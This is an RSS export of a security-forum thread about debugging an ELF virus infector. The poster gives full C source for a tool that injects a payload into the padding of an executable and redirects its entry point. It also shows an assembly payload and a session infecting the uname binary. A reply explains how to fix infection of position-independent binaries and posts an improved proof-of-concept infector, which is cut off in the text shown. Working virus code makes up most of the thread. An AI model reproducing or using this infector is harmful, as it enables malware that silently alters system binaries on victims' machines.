<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Doubt infect ELF</title>
    <link>https://0x00sec.org/t/doubt-infect-elf/13605</link>
    <description>Hi all.

I testing using the follow post https://0x00sec.org/t/elfun-file-injector/410, but not work. bellow the post code i&#39;m using.

------------------------------------ infecta.c ------------------------------------------------

    #include &lt;stdio.h&gt;
    #include &lt;stdlib.h&gt;
    #include &lt;string.h&gt;
    #include &lt;stdint.h&gt;


    #include &lt;unistd.h&gt;
    #include &lt;fcntl.h&gt;
    #include &lt;sys/stat.h&gt;

    #include &lt;elf.h&gt;
    #include &lt;sys/mman.h&gt;


    /* Helper functions */
    static int get_file_size (int fd)
    {
            struct stat _info;
            fstat (fd, &amp;_info);
            return _info.st_size;
    }

    /* Open a file and map it in memory for easy update */
    int elfi_open_and_map (char *fname, void **data, int *len)
    {
            int size;
            int fd;

            if ((fd = open (fname, O_APPEND | O_RDWR, 0)) &lt; 0)
            {
                    perror (&quot;open:&quot;);
                    exit (1);
            }

            size = get_file_size (fd);
            if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC, MAP_SHARED, fd, 0)) == MAP_FAILED)
            {
                    perror (&quot;mmap:&quot;);
                    exit (1);
            }

            printf (&quot;+ Arquivo mapeado (%d bytes ) em %p\n&quot;, size, data);
            *len = size;
            return fd;
    }


    #ifdef DEBUG
    /* Debug function to dump registers */
    void
    elfi_dump_segments (void *d)
    {
      Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
      Elf64_Phdr* elf_seg;
      int         n_seg = elf_hdr-&gt;e_phnum;
      int         i;

    //  printf(&quot;O tamanho de struct Elf64_Phdr: %ld \n&quot;, sizeof(Elf64_Phdr));

      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr-&gt;e_phoff);
      for (i = 0; i &lt; n_seg; i++)
        {
            printf (&quot; [INFO] Segment %d: Type: %8x (%x) Offset: %8x &quot;
                    &quot;FSize:%8x MSize:%8x\n&quot;,
                    i, elf_seg-&gt;p_type, elf_seg-&gt;p_flags,
                    (unsigned int)elf_seg-&gt;p_offset,
                    (unsigned int)elf_seg-&gt;p_filesz,
                    (unsigned int)elf_seg-&gt;p_memsz);

          elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg
                                + (unsigned int) elf_hdr-&gt;e_phentsize);
        }

    }
    #endif

    // len: tamanho do gap
    // p: final do segmento
    // d: arquivo elf com as section e program table
    // fsize: tamanho do binario
    //
    //         /* Find executable segment and obtain offset and gap size */
    //        vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &amp;p, &amp;len);
    Elf64_Phdr* elfi_find_gap(void *mapeado, int TamanhoArquivo, int *p, int *len)
    {
            // struct header ELF
            Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) mapeado;
            // struct program header
            Elf64_Phdr* elf_program, *text_program_vitima;
            // e_phnum: numero de entradas na tabela programa
            int         n_seg = elf_hdr-&gt;e_phnum;
            int         i;
            int         text_end, gap=TamanhoArquivo;

            //printf(&quot;O tamanho de struct Elf64_Phdr: %ld \n&quot;, sizeof(Elf64_Phdr));
            //printf(&quot;O tamanho da variavel elf_hdr: %ld \n&quot;, sizeof(elf_hdr));
            //printf(&quot;O tamanho de struct elf_hdr-&gt;e_phoff: %ld \n&quot;, sizeof(elf_hdr-&gt;e_phoff));



            // e_phoff: aponta para o inicio da tabela de programa
            elf_program = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr-&gt;e_phoff);
    //      printf(&quot;p_type %d \n&quot;, elf_seg-&gt;p_type);

            for (i = 0; i &lt; n_seg; i++)
            {
            //      printf(&quot;elf_program-&gt;p_flags: %#x\n&quot;, elf_program-&gt;p_flags);
            //      printf(&quot;elf_program-&gt;p_type: %#x\n&quot;, elf_program-&gt;p_type);
    //      printf(&quot;elf_program-&gt;p_offset: %#lx\n&quot;, elf_program-&gt;p_offset);
            // p_flags: flags define o tipo do segmento(cabecalho de programa
            // Name         | Value   | Meaning
            // PF_X         | 0x1     | Execute
            // PF_W         | 0x2     | Write
            // PF_R         | 0x4     | Read
            // PF_MASKPROC  | 0xf0000000 | Unspecified
            // 0x1 and 0x011 = 1 (verdadeiro)
            // 0x2 and 0x011 = 0 (falso)
            // 0x4 and 0x011 = 0 (falso)
            // 0xf0000000 and 0x011 = 0 (falso)
            // Entao o comando: elf_seg-&gt;p_flags &amp; 0x011 -&gt; Procura por um segmento &quot;execute&quot;
            if (elf_program-&gt;p_type == PT_LOAD &amp;&amp; elf_program-&gt;p_flags &amp; 0x011)
          {

                            printf (&quot;+ Processando Vitima -&gt; Encontrado segmento .text executavel (#%d)\n&quot;, i);
            /*              printf(&quot;elf_program-&gt;p_type: %d \n&quot;, elf_program-&gt;p_type);
                            printf(&quot;elf_program-&gt;p_offset: %ld \n&quot;, elf_program-&gt;p_offset);
                            printf(&quot;elf_program-&gt;p_filesz: %ld \n&quot;, elf_program-&gt;p_filesz);
    */
                            //text_seg = elf_seg(o segmento progam atual
                            text_program_vitima = elf_program;


                            // elf_program-&gt;p_offset: Contem o offset do segmento program no arquivo binario
                            // elf_program-&gt;p_filesz: Size in bytes of the segment in the file image. May be 0.
                            // variavel text_end pega o tamanho do segmento text
                            text_end = elf_program-&gt;p_offset + elf_program-&gt;p_filesz;
    //                      printf(&quot;o valor de text_end: %d \n&quot;, text_end);
          } else {
                            //p_offset: Contem o offset do segmento program no arquivo binario
                            // elf_program-&gt;p_offset do segundo segmento LOAD do tipo RW - o final do
                            // segmento LOAD Executavel
                            if (elf_program-&gt;p_type == PT_LOAD &amp;&amp; (elf_program-&gt;p_offset - text_end) &lt; gap)
                            {

    /*                      printf(&quot;elf_program-&gt;p_type: %d \n&quot;, elf_program-&gt;p_type);
                            printf(&quot;elf_program-&gt;p_offset: %lx \n&quot;, elf_program-&gt;p_offset);
                            printf(&quot;elf_program-&gt;p_filesz: %ld \n&quot;, elf_program-&gt;p_filesz);

                            printf(&quot;o valor de text_end: %d \n&quot;, text_end);
                            printf(&quot;o valor de gap: %d \n&quot;, gap);
    */
                            printf (&quot;   * Processando Vitima -&gt; Encontrado segmento LOAD (#%d) fechado para .text (offset: 0x%x)\n&quot;, i, (unsigned int)elf_program-&gt;p_offset);

                                    gap = elf_program-&gt;p_offset - text_end;
                            }
                    }
                    // q
                    // e_phentsize: contem o tamanho de uma entrada de uma tabela de secao
          elf_program = (Elf64_Phdr *) ((unsigned char*) elf_program + (unsigned int) elf_hdr-&gt;e_phentsize);
        }

            *p = text_end;
            *len = gap;


            return text_program_vitima;
    }



    Elf64_Shdr *elfi_find_section (void *data, char *name)
    {
      char        *sname;
      int         i;
      Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
      // e_shoff:   Points to the start of the section header table.
      Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr-&gt;e_shoff);
      // e_shstrndx: Contains index of the section header table entry that contains the section names.
      Elf64_Shdr *sh_strtab = &amp;shdr[elf_hdr-&gt;e_shstrndx];
      // sh_offset: Offset of the section in the file image.
      const char *const sh_strtab_p = data + sh_strtab-&gt;sh_offset;

      // e_shnum: Contains the number of entries in the section header table.
      printf (&quot;+ Procesasmento Payload -&gt; Quantidade de Seções no arquivo Payload: %d . Procurando pela seção &#39;%s&#39;\n&quot;, elf_hdr-&gt;e_shnum, name);


      for (i = 0; i &lt; elf_hdr-&gt;e_shnum; i++)
      {
    //      printf(&quot;Processamento Payload -&gt; O shdr[%d].sh_name: %x \n&quot;, i, shdr[i].sh_name);
            sname = (char*) (sh_strtab_p + shdr[i].sh_name);

            printf(&quot; + Processando payload -&gt; sname: &#39;%s&#39;\n&quot;, sname);


            if (!strcmp (sname, name))
            {
                    printf(&quot;entrou no if retornando \n&quot;);
                    printf(&quot;shdr-&gt;sh_name: %x  \n&quot;, shdr[i].sh_name);


                    printf(&quot;shdr-&gt;sh_type: %x \n&quot;, shdr[i].sh_type);
                    printf(&quot;shdr-&gt;sh_addr: %lx \n&quot;, shdr[i].sh_addr);
                    return &amp;shdr[i];
            }
      }

      return NULL;
    }



    // MapeadoVitima + p: e o arquivo vitima mapeado mais o program header
    // len: tamanho do gap
    // pat: padrao a buscar
    // val: entrypoint do arquivo elf vitima
    //
    //  elfi_mem_subst (MapeadoVitima+p, payload_text_section-&gt;sh_size, 0x11111111, (long)ep);
    int elfi_mem_subst(void *m, int len, long pat, long val)
    {
            // obtem o endereco do program header da vitima
            unsigned char *p = (unsigned char*)m;
            long v;
            int i, r;

            /*
            printf(&quot;p: %hhn\n&quot;, p);
            printf(&quot;pat: %lx\n&quot;, pat);
            printf(&quot;val: %lx\n&quot;, val);
            printf(&quot;entrando no for\n\n&quot;);
    */
    //      printf(&quot;len: %d \n&quot;, len);


            for (i = 0; i &lt; len; i++)
            {
                    v = *((long*)(p+i));
                    // faz um xor da variavel v e varial pat
                    r = v ^pat;


    //              printf(&quot;v: %lx\n&quot;, v);
            //      printf(&quot;r: %x\n&quot;, r);

                    if (r ==0)
                    {
                            printf (&quot;+ Padrão %lx encontrado no offset %d -&gt; %lx\n&quot;, pat, i, val);
                            *((long*)(p+i)) = val;
                            return 0;
                    }
            }
            return -1;
    }

    int main (int argc, char *argv[])
    {
            void        *MapeadoVitima, *MapeadoPayload;
            int         Vitima_fd, payload_fd;
            int         TamanhoVitima, TamanhoPayload;
            // Struct para o header ELF
            Elf64_Ehdr* elf_hdr;
            // Struct para program header
            Elf64_Phdr  *vitima_text_program;
            // struct para section header
            Elf64_Shdr  *payload_text_section;
            // struct de enderecos base
            Elf64_Addr  base, ep;
            //variavel len = gap
            //variavel p=final do segmento LOAD executavel
            int         p, len;


            printf (&quot;Exemplo de virus ELF\n\n&quot;);
            if (argc != 3)
            {
                    fprintf (stderr, &quot;Uso:\n  %s &lt;arquivo ELF&gt; &lt;payload&gt;\n&quot;, argv[0]);
                    exit (1);
            }

            /* Open and map target ELF */
            Vitima_fd = elfi_open_and_map (argv[1], &amp;MapeadoVitima, &amp;TamanhoVitima);

            /* Get Application Entry point */
            elf_hdr = (Elf64_Ehdr *) MapeadoVitima;
            ep = elf_hdr-&gt;e_entry;
            printf (&quot;+ Processando Vitima -&gt; Valor do Entry point: %p\n&quot;, (void*) ep);

    #ifdef DEBUG
      elfi_dump_segments (d);
    #endif

            /* Find executable segment and obtain offset and gap size */
            vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &amp;p, &amp;len);

            // p_vaddr: Virtual address of the segment program in memory
            base = vitima_text_program-&gt;p_vaddr;

            printf (&quot;+ Processando vitima -&gt; Endereco Base(Base Address) : 0x%p\n&quot;, (void*)base);

            /* Process payload */
            payload_fd = elfi_open_and_map (argv[2], &amp;MapeadoPayload, &amp;TamanhoPayload);

            // funcao que busca o segmento .text
            // MapeadoPayload: arquivo elf a ser injetado na vitima
            // payload_text_section: retorna com o section segmento do .text a ser injetado
            payload_text_section = elfi_find_section (MapeadoPayload, &quot;.text&quot;);

            //mostraSectionHeaderELF(payload_text_section);

      /* XXX: Looks like we do not really have to patch the segment sizes */
      /*
      vitima_text_program-&gt;p_filesz += payload_text_section-&gt;sh_size;
      vitima_text_program-&gt;p_memsz += payload_text_section-&gt;sh_size;
      */

            printf (&quot;+ Processando Payload -&gt; Secao .text do arquivo Payload encontrado no offset %lx (Tamanho: %lx bytes)\n&quot;,  payload_text_section-&gt;sh_offset, payload_text_section-&gt;sh_size);

            if (payload_text_section-&gt;sh_size &gt; len)
            {
                    fprintf (stderr, &quot;- Processando Payload -&gt; Arquivo Payload muito grande, Não é possivel infectar.\n&quot;);
                    exit (1);
            }
      /* Copy payload in the segment padding area */
      // memmove(dest, src, count): copia count bytes do buffer apontado por src para o buffer apontado por dest.
      //

      memmove (MapeadoVitima + p, MapeadoPayload + payload_text_section-&gt;sh_offset, payload_text_section-&gt;sh_size );

      /* Patch return address */
      elfi_mem_subst (MapeadoVitima+p, payload_text_section-&gt;sh_size, 0x11111111, (long)ep);

      /* Patch entry point */
      elf_hdr-&gt;e_entry = (Elf64_Addr) (base + p);

      /* Close files and actually update target file */
      close (payload_fd);
      close (Vitima_fd);

      return 0;
    }

My payload is:

------------payload.asm-------------

    section .text
            global _start
    _start:
            mov rax,1       ; [1] - sys_write
            mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
            lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
            mov rdx, msg_end - msg      ; msg size
            syscall         ; calls the function stored in rax

            mov rax, 0x11111111
            jmp rax
    align 8
            msg     db &#39;Arquivo infectado Teste&#39;,0x0a,0
            msg_end db 0x0


I am trying to infect the uname binary.

&gt;root@bumblee:~/dev/infectELF/versao3# /bin/uname
Linux
root@bumblee:~/dev/infectELF/versao3#

    root@bumblee:~/dev/infectELF/versao3# ./infecta ./uname payload
    Exemplo de virus ELF

    + Arquivo mapeado (35032 bytes ) em 0x7ffd3f89dee0
    + Processando Vitima -&gt; Valor do Entry point: 0x1f60
    + Processando Vitima -&gt; Encontrado segmento .text executavel (#2)
       * Processando Vitima -&gt; Encontrado segmento LOAD (#3) fechado para .text (offset: 0x7990)
    + Processando vitima -&gt; Endereco Base(Base Address) : 0x(nil)
    + Arquivo mapeado (808 bytes ) em 0x7ffd3f89dee8
    + Procesasmento Payload -&gt; Quantidade de Seções no arquivo Payload: 5 . Procurando pela seção &#39;.text&#39;
     + Processando payload -&gt; sname: &#39;&#39;
     + Processando payload -&gt; sname: &#39;.text&#39;
    entrou no if retornando
    shdr-&gt;sh_name: 1b
    shdr-&gt;sh_type: 1
    shdr-&gt;sh_addr: 400080
    + Processando Payload -&gt; Secao .text do arquivo Payload encontrado no offset 80 (Tamanho: 3a bytes)
    + Padrão 11111111 encontrado no offset 25 -&gt; 1f60
    root@bumblee:~/dev/infectELF/versao3#


note the entrypoint address of the original binary file is 0x1f60

&gt;root@bumblee:~/dev/infectELF/versao3# readelf -h /bin/uname
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2&#39;s complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Shared object file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x1f60
  Start of program headers:          64 (bytes into file)
  Start of section headers:          33240 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         9
  Size of section headers:           64 (bytes)
  Number of section headers:         28
  Section header string table index: 27
root@bumblee:~/dev/infectELF/versao3#

after infecting it it changes the entrypoint to address 0x6e80 by picking up the code of 6e80 I see the following opcodes(i using the xxd command)

&gt;00006e80: b801 0000 00bf 0100 0000 488d 350f 0000  
00006e90: 00ba 2600 0000 0f05 b860 1f00 00ff e0 000 
00006ea0: 0072 7175 6976 6f20 696e 6665 6374 6164  
00006eb0: 6f20 5375 6375 7269 2048 6163 6b65 7220 
00006ec0: 436c 7562 0a00 0000 0000 0000 0000 0000

copying the opcode string and playing on the site disassembler.io.

![hacker01|690x299](upload://e0EmwXSGSE7eiNEVWs4weOkZDVX.png) 

note that the assembly code is to display the message and then jump to the address 0x1f60 which is the oirginal entrypoint of the uname binary file. But I get the message of segment fault

    root@bumblee:~/dev/infectELF/versao3# ./uname
    Arquivo infectado teste
    Segmentation fault (core dumped)
    root@bumblee:~/dev/infectELF/versao3#

Could someone help me where I&#39;m wrong?


    root@bumblee:~/dev/infectELF/versao3# dmesg
    [ 1623.698745] uname[1402]: segfault at 1f60 ip 0000560080a57e9d sp 00007ffe8923a260 error 6 in uname[560080a51000+7000]
    root@bumblee:~/dev/infectELF/versao3#

In dmesg I have a message but I do not quite understand

someone can help me understand what I&#39;m doing wrong. Thank you very much in advance

Regards</description>
    
    <lastBuildDate>Mon, 13 May 2019 21:14:10 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/doubt-infect-elf/13605.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Doubt infect ELF</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/doubt-infect-elf/13605/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/doubt-infect-elf/13605/8</link>
        <pubDate>Mon, 10 Jun 2019 23:26:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13605-8</guid>
        <source url="https://0x00sec.org/t/doubt-infect-elf/13605.rss">Doubt infect ELF</source>
      </item>
      <item>
        <title>Doubt infect ELF</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Thanks mate!</p>
<p>Looking forward to that multi-arch ELF infector!!!</p>
          <p><a href="https://0x00sec.org/t/doubt-infect-elf/13605/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/doubt-infect-elf/13605/7</link>
        <pubDate>Mon, 13 May 2019 21:14:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13605-7</guid>
        <source url="https://0x00sec.org/t/doubt-infect-elf/13605.rss">Doubt infect ELF</source>
      </item>
      <item>
        <title>Doubt infect ELF</title>
        <dc:creator><![CDATA[jbx81]]></dc:creator>
        <description><![CDATA[
            <p>Your solution is better! i’m working to make a multi-arch ELF infector. nice work <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a></p>
          <p><a href="https://0x00sec.org/t/doubt-infect-elf/13605/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/doubt-infect-elf/13605/6</link>
        <pubDate>Mon, 13 May 2019 21:09:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13605-6</guid>
        <source url="https://0x00sec.org/t/doubt-infect-elf/13605.rss">Doubt infect ELF</source>
      </item>
      <item>
        <title>Doubt infect ELF</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://0x00sec.org/u/spiderslack">@spiderslack</a></p>
<p>I have just updated my repo for completeness. <a class="mention" href="https://0x00sec.org/u/jbx81">@jbx81</a> solution is also good.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/0x00pf/0x00sec_code/tree/master/elfpie" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/0x00pf/0x00sec_code/tree/master/elfpie" target="_blank" rel="noopener nofollow ugc">0x00pf/0x00sec_code</a></h3>

<p>Code for my 0x00sec.org posts. Contribute to 0x00pf/0x00sec_code development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Guys let me know if you want a post on this or you are all fine with just the code</p>
          <p><a href="https://0x00sec.org/t/doubt-infect-elf/13605/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/doubt-infect-elf/13605/5</link>
        <pubDate>Mon, 13 May 2019 18:37:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13605-5</guid>
        <source url="https://0x00sec.org/t/doubt-infect-elf/13605.rss">Doubt infect ELF</source>
      </item>
      <item>
        <title>Doubt infect ELF</title>
        <dc:creator><![CDATA[jbx81]]></dc:creator>
        <description><![CDATA[
            <p>If you’re trying to infect a DYN ELF you have only find offset between real e_entry and the new entry point address.<br>
DYN elf first load libraries, then move e_entry to edi (x86) or to r12 (x86_64) and jump<br>
so in your shellcode you have only to sub the offset from edi/r12 (so you will point to original entry) than save the address on the stack or keep it and jump to address. i have done a python script for that, if i find it i will share.</p>
<p>I have made a PoC.</p>
<p>infecta.c</p>
<pre><code>/*
 * infecta.c
 *
 *  Created on: May 13, 2019
 *
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;


#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;

#include &lt;elf.h&gt;
#include &lt;sys/mman.h&gt;


/* Helper functions */
static int get_file_size (int fd)
{
        struct stat _info;
        fstat (fd, &amp;_info);
        return _info.st_size;
}

/* Open a file and map it in memory for easy update */
int elfi_open_and_map (char *fname, void **data, int *len)
{
        int size;
        int fd;

        if ((fd = open (fname, O_APPEND | O_RDWR, 0)) &lt; 0)
        {
                perror ("open:");
                exit (1);
        }

        size = get_file_size (fd);
        if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC, MAP_SHARED, fd, 0)) == MAP_FAILED)
        {
                perror ("mmap:");
                exit (1);
        }

        printf ("+ Arquivo mapeado (%d bytes ) em %p\n", size, data);
        *len = size;
        return fd;
}


#ifdef DEBUG
/* Debug function to dump registers */
void
elfi_dump_segments (void *d)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg;
  int         n_seg = elf_hdr-&gt;e_phnum;
  int         i;

//  printf("O tamanho de struct Elf64_Phdr: %ld \n", sizeof(Elf64_Phdr));

  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr-&gt;e_phoff);
  for (i = 0; i &lt; n_seg; i++)
    {
        printf (" [INFO] Segment %d: Type: %8x (%x) Offset: %8x "
                "FSize:%8x MSize:%8x\n",
                i, elf_seg-&gt;p_type, elf_seg-&gt;p_flags,
                (unsigned int)elf_seg-&gt;p_offset,
                (unsigned int)elf_seg-&gt;p_filesz,
                (unsigned int)elf_seg-&gt;p_memsz);

      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg
                            + (unsigned int) elf_hdr-&gt;e_phentsize);
    }

}
#endif

// len: tamanho do gap
// p: final do segmento
// d: arquivo elf com as section e program table
// fsize: tamanho do binario
//
//         /* Find executable segment and obtain offset and gap size */
//        vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &amp;p, &amp;len);
Elf64_Phdr* elfi_find_gap(void *mapeado, int TamanhoArquivo, int *p, int *len)
{
        // struct header ELF
        Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) mapeado;
        // struct program header
        Elf64_Phdr* elf_program, *text_program_vitima;
        // e_phnum: numero de entradas na tabela programa
        int         n_seg = elf_hdr-&gt;e_phnum;
        int         i;
        int         text_end, gap=TamanhoArquivo;

        //printf("O tamanho de struct Elf64_Phdr: %ld \n", sizeof(Elf64_Phdr));
        //printf("O tamanho da variavel elf_hdr: %ld \n", sizeof(elf_hdr));
        //printf("O tamanho de struct elf_hdr-&gt;e_phoff: %ld \n", sizeof(elf_hdr-&gt;e_phoff));



        // e_phoff: aponta para o inicio da tabela de programa
        elf_program = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr-&gt;e_phoff);
//      printf("p_type %d \n", elf_seg-&gt;p_type);

        for (i = 0; i &lt; n_seg; i++)
        {
        //      printf("elf_program-&gt;p_flags: %#x\n", elf_program-&gt;p_flags);
        //      printf("elf_program-&gt;p_type: %#x\n", elf_program-&gt;p_type);
//      printf("elf_program-&gt;p_offset: %#lx\n", elf_program-&gt;p_offset);
        // p_flags: flags define o tipo do segmento(cabecalho de programa
        // Name         | Value   | Meaning
        // PF_X         | 0x1     | Execute
        // PF_W         | 0x2     | Write
        // PF_R         | 0x4     | Read
        // PF_MASKPROC  | 0xf0000000 | Unspecified
        // 0x1 and 0x011 = 1 (verdadeiro)
        // 0x2 and 0x011 = 0 (falso)
        // 0x4 and 0x011 = 0 (falso)
        // 0xf0000000 and 0x011 = 0 (falso)
        // Entao o comando: elf_seg-&gt;p_flags &amp; 0x011 -&gt; Procura por um segmento "execute"
        if (elf_program-&gt;p_type == PT_LOAD &amp;&amp; elf_program-&gt;p_flags &amp; 0x011)
      {

                        printf ("+ Processando Vitima -&gt; Encontrado segmento .text executavel (#%d)\n", i);
        /*              printf("elf_program-&gt;p_type: %d \n", elf_program-&gt;p_type);
                        printf("elf_program-&gt;p_offset: %ld \n", elf_program-&gt;p_offset);
                        printf("elf_program-&gt;p_filesz: %ld \n", elf_program-&gt;p_filesz);
*/
                        //text_seg = elf_seg(o segmento progam atual
                        text_program_vitima = elf_program;


                        // elf_program-&gt;p_offset: Contem o offset do segmento program no arquivo binario
                        // elf_program-&gt;p_filesz: Size in bytes of the segment in the file image. May be 0.
                        // variavel text_end pega o tamanho do segmento text
                        text_end = elf_program-&gt;p_offset + elf_program-&gt;p_filesz;
//                      printf("o valor de text_end: %d \n", text_end);
      } else {
                        //p_offset: Contem o offset do segmento program no arquivo binario
                        // elf_program-&gt;p_offset do segundo segmento LOAD do tipo RW - o final do
                        // segmento LOAD Executavel
                        if (elf_program-&gt;p_type == PT_LOAD &amp;&amp; (elf_program-&gt;p_offset - text_end) &lt; gap)
                        {

/*                      printf("elf_program-&gt;p_type: %d \n", elf_program-&gt;p_type);
                        printf("elf_program-&gt;p_offset: %lx \n", elf_program-&gt;p_offset);
                        printf("elf_program-&gt;p_filesz: %ld \n", elf_program-&gt;p_filesz);

                        printf("o valor de text_end: %d \n", text_end);
                        printf("o valor de gap: %d \n", gap);
*/
                        printf ("   * Processando Vitima -&gt; Encontrado segmento LOAD (#%d) fechado para .text (offset: 0x%x)\n", i, (unsigned int)elf_program-&gt;p_offset);

                                gap = elf_program-&gt;p_offset - text_end;
                        }
                }
                // q
                // e_phentsize: contem o tamanho de uma entrada de uma tabela de secao
      elf_program = (Elf64_Phdr *) ((unsigned char*) elf_program + (unsigned int) elf_hdr-&gt;e_phentsize);
    }

        *p = text_end;
        *len = gap;


        return text_program_vitima;
}



Elf64_Shdr *elfi_find_section (void *data, char *name)
{
  char        *sname;
  int         i;
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
  // e_shoff:   Points to the start of the section header table.
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr-&gt;e_shoff);
  // e_shstrndx: Contains index of the section header table entry that contains the section names.
  Elf64_Shdr *sh_strtab = &amp;shdr[elf_hdr-&gt;e_shstrndx];
  // sh_offset: Offset of the section in the file image.
  const char *const sh_strtab_p = data + sh_strtab-&gt;sh_offset;

  // e_shnum: Contains the number of entries in the section header table.
  printf ("+ Procesasmento Payload -&gt; Quantidade de Seções no arquivo Payload: %d . Procurando pela seção '%s'\n", elf_hdr-&gt;e_shnum, name);


  for (i = 0; i &lt; elf_hdr-&gt;e_shnum; i++)
  {
//      printf("Processamento Payload -&gt; O shdr[%d].sh_name: %x \n", i, shdr[i].sh_name);
        sname = (char*) (sh_strtab_p + shdr[i].sh_name);

        printf(" + Processando payload -&gt; sname: '%s'\n", sname);


        if (!strcmp (sname, name))
        {
                printf("entrou no if retornando \n");
                printf("shdr-&gt;sh_name: %x  \n", shdr[i].sh_name);


                printf("shdr-&gt;sh_type: %x \n", shdr[i].sh_type);
                printf("shdr-&gt;sh_addr: %lx \n", shdr[i].sh_addr);
                return &amp;shdr[i];
        }
  }

  return NULL;
}



// MapeadoVitima + p: e o arquivo vitima mapeado mais o program header
// len: tamanho do gap
// pat: padrao a buscar
// val: entrypoint do arquivo elf vitima
//
//  elfi_mem_subst (MapeadoVitima+p, payload_text_section-&gt;sh_size, 0x11111111, (long)ep);
int elfi_mem_subst(void *m, int len, long pat, long val)
{
        // obtem o endereco do program header da vitima
        unsigned char *p = (unsigned char*)m;
        long v;
        int i, r;

        /*
        printf("p: %hhn\n", p);
        printf("pat: %lx\n", pat);
        printf("val: %lx\n", val);
        printf("entrando no for\n\n");
*/
//      printf("len: %d \n", len);


        for (i = 0; i &lt; len; i++)
        {
                v = *((long*)(p+i));
                // faz um xor da variavel v e varial pat
                r = v ^pat;


//              printf("v: %lx\n", v);
        //      printf("r: %x\n", r);

                if (r ==0)
                {
                        printf ("+ Padrão %lx encontrado no offset %d -&gt; %lx\n", pat, i, val);
                        *((long*)(p+i)) = val;
                        return 0;
                }
        }
        return -1;
}

int main (int argc, char *argv[])
{
        void        *MapeadoVitima, *MapeadoPayload;
        int         Vitima_fd, payload_fd;
        int         TamanhoVitima, TamanhoPayload;
        // Struct para o header ELF
        Elf64_Ehdr* elf_hdr;
        // Struct para program header
        Elf64_Phdr  *vitima_text_program;
        // struct para section header
        Elf64_Shdr  *payload_text_section;
        // struct de enderecos base
        Elf64_Addr  base, ep;
        //variavel len = gap
        //variavel p=final do segmento LOAD executavel
        int         p, len;

        int offset_mode = 0x00;

        printf ("Exemplo de virus ELF\n\n");
        if (argc == 2){
        	printf("Running in offset mode");
        	offset_mode = 0x01;
        }
        if ((argc != 3 &amp;&amp; argc != 2))
        {
                fprintf (stderr, "Uso:\n  %s &lt;arquivo ELF&gt; &lt;payload&gt;\n", argv[0]);
                exit (1);
        }

        /* Open and map target ELF */
        Vitima_fd = elfi_open_and_map (argv[1], &amp;MapeadoVitima, &amp;TamanhoVitima);

        /* Get Application Entry point */
        elf_hdr = (Elf64_Ehdr *) MapeadoVitima;
        ep = elf_hdr-&gt;e_entry;
        printf ("+ Processando Vitima -&gt; Valor do Entry point: %p\n", (void*) ep);

#ifdef DEBUG
  elfi_dump_segments (d);
#endif

        /* Find executable segment and obtain offset and gap size */
        vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &amp;p, &amp;len);
